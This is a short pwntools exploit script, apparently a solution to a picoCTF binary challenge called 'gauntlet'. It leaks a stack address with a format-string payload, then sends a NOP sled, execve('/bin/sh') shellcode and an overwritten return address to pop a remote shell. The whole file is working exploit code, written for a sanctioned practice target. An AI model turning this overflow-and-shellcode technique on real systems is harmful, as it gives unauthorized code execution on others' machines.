from pwn import *

r = remote("wily-courier.picoctf.net" , 58148)

binary = "/mnt/c/Users/PC/Downloads/gauntlet"

# r = process(binary)


elf = ELF(binary)
context.arch = elf.arch
context.log_level = "debug"
context.binary = binary


payload1 = b"%p|"*23
r.sendline(payload1)
stack = r.recvline().split(b"|")

leak = int(stack[5]  , 16)
far = -392
print(far)
gdb.attach(r)
local_78_addr = leak + far + 64


offset = 120

# shellcode = asm(shellcode.sh())
shellcode = asm("""
    /* rsi , rdx xor to zero */
    xor rsi, rsi
    xor rdx, rdx

    /* ; prepare "/bin/sh" string */
    mov rax, 0x68732f6e69622f2f
    shr rax, 8
    push rax
    mov rdi, rsp

    /* ; set syscall and trigger */
    push 59
    pop rax
    syscall
""")
offset -= 64
payload = b"\x90"*64 + shellcode + b"\x90"*(offset-len(shellcode)) + p64(local_78_addr)

r.sendline(payload)

r.interactive()
